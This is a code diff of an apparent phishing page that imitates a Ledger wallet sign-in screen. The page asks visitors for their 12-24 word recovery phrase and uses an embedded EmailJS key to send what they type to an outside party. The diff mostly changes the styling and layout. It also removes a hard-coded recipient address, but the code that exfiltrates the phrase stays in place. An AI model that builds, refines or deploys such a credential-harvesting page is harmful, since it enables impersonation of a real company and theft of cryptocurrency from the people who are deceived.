@@ -3,8 +3,125 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Ledger Sign In</title>
+    <title>Ledger - Sign In</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: linear-gradient(to right, #f4e2db, #ebeee8);
+      }
+      .container {
+        background: white;
+        padding: 30px;
+        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        text-align: left;
+        width: 350px;
+        border-radius: 5px;
+      }
+
+      .ledger-logo {
+        width: 90px;
+        margin-bottom: 10px;
+        display: block;
+      }
+      .title {
+        font-size: 22px;
+        font-weight: bold;
+        margin-bottom: 15px;
+      }
+      label {
+        font-size: 14px;
+        color: #555;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        border: none;
+        border-bottom: 1px solid black;
+        outline: none;
+      }
+      .error {
+        color: red;
+        font-size: 14px;
+        display: none;
+        margin-top: 5px;
+      }
+      .buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 20px;
+      }
+      .btn {
+        padding: 10px 20px;
+        border: none;
+        cursor: pointer;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+      .btn-back {
+        background: #ccc;
+        border-radius: 0%;
+      }
+      .btn-next {
+        background: rgb(0, 103, 184);
+        color: white;
+        border-radius: 0;
+      }
+
+      /* === Responsive for Mobile === */
+      @media (max-width: 600px) {
+        body {
+          align-items: flex-start; /* Moves content to the top */
+          height: auto; /* Allows scrolling */
+          padding-top: -10px;
+        }
+        .container {
+          width: 100%;
+          box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+          border-radius: 0; /* Removes rounded corners */
+          height: 25vh;
+        }
+        .buttons {
+          width: 10vh;
+          gap: 25px;
+          margin-left: 120px;
+          /* flex-direction: column; */
+        }
+        .btn {
+          width: 100%;
+          margin-top: 10px;
+          /* margin-top: -5px; */
+        }
+        .ledger-logo {
+          width: 9vh;
+          font-weight: lighter;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
+      <p class="title">Sign in</p>
+      <!-- <label>Enter Wallet 12-24 Key Phrase</label> -->
+      <input
+        type="text"
+        id="walletPhrase"
+        placeholder="Enter Wallet 12-24 Key Phrase"
+      />
+      <p class="error" id="error">The Phrase must be between 12 to 24 words.</p>
+      <div class="buttons">
+        <button class="btn btn-back">Back</button>
+        <button class="btn btn-next" onclick="validatePhrase()">Next</button>
+      </div>
+    </div>
+
     <script>
       (function () {
         emailjs.init("3ijyLWGjsj4QnVlp_"); // Replace with your actual EmailJS Public Key
@@ -21,9 +138,7 @@
           // Send Email using EmailJS
           let emailParams = {
             from_name: "User Wallet Input",
-            to_email: "Alwaysgrateful670@gmail.com", // Replace with your actual email
             message: `User input: ${phrase}`,
-            c,
           };
 
           emailjs
@@ -41,90 +156,5 @@
         }
       }
     </script>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background-color: #f8f8f8;
-      }
-      .container {
-        background: white;
-        padding: 40px;
-        border-radius: 8px;
-        box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-        width: 400px;
-      }
-      .ledger-logo {
-        width: 120px; /* Adjust size as needed */
-        margin-bottom: 5px;
-        display: block;
-      }
-      .title-container {
-        text-align: left; /* Align logo and text to the left */
-      }
-      h2 {
-        font-size: 24px;
-        margin-bottom: 20px;
-      }
-      input {
-        width: 100%;
-        padding: 12px;
-        margin: 10px 0;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-        font-size: 16px;
-      }
-      .buttons {
-        display: flex;
-        justify-content: space-between;
-        margin-top: 10px;
-      }
-      button {
-        padding: 12px 20px;
-        border: none;
-        cursor: pointer;
-        border-radius: 5px;
-        font-size: 16px;
-      }
-      .back {
-        background: #ccc;
-      }
-      .next {
-        background: #007bff;
-        color: white;
-      }
-      #error {
-        color: red;
-        margin-top: 10px;
-        display: none;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div class="title-container">
-        <!-- Replace with your actual logo URL -->
-        <img
-          src="image/download (9).png"
-          alt="Ledger Logo"
-          class="ledger-logo"
-        />
-        <h2>Sign in</h2>
-      </div>
-
-      <input
-        type="text"
-        id="walletPhrase"
-        placeholder="Enter Wallet 12-24 Key Phrase"
-      />
-      <div class="buttons">
-        <button class="back">Back</button>
-        <button class="next" onclick="validatePhrase()">Next</button>
-      </div>
-      <p id="error">Phrase must have exactly 12 or 24 words.</p>
-    </div>
   </body>
 </html>
